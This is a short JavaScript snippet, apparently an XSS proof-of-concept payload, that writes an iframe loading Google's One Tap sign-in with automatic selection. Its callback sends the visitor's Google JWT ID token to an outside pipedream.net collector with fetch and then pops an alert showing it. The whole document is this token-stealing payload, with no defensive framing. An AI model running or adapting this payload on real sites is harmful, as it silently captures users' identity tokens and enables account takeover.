document.write(`<iframe srcdoc='<script src="https://accounts.google.com/gsi/client" async defer></script><script>
function handleCredentialResponse(response) {
  // Here we can do whatever process with the response we want
  // Note that response.credential is a JWT ID token
  fetch("https://en2celr7rewbul.m.pipedream.net/?token="+response.credential)
  alert("Encoded JWT ID token: " + response.credential);
}
</script><div id="g_id_onload"
     data-client_id="49625052041-kgt0hghf445lmcmhijv46b715m2mpbct.apps.googleusercontent.com"
     data-callback="handleCredentialResponse" data-auto_select="true"></div>'></iframe>`)
